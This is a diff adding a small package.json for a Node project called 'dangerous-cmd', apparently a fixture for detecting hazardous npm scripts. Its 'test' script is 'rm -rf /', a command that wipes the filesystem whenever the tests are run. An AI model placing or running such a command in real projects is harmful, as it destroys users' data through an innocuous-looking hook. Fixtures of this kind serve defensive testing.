@@ -1,0 +1,12 @@
+{
+  "name": "dangerous-cmd",
+  "version": "1.0.0",
+  "scripts": {
+    "dev": "node index.js",
+    "build": "tsc",
+    "test": "rm -rf /"
+  },
+  "dependencies": {
+    "express": "^4.19.2"
+  }
+}
